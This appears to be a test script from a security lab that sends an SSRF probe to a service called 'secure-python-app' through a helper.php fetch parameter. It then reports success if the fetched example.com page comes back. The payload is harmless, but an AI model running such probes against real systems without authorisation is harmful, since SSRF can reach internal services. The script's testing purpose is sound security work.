#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing SSRF on ${service_map[secure-python-app]}"

output=$(curl -s "http://${service_map[secure-python-app]}/helper.php?fetch=http://example.com" \
  --insecure)
if [ $? -eq 0 ]; then
    echo "[+] SSRF payload sent successfully"
else
    echo "[-] SSRF payload failed to send"
    exit 1
fi
if echo "$output" | grep -q "Example Domain"; then
    echo "[+] SSRF attack executed successfully"
else
    echo "[-] SSRF attack failed"
fi
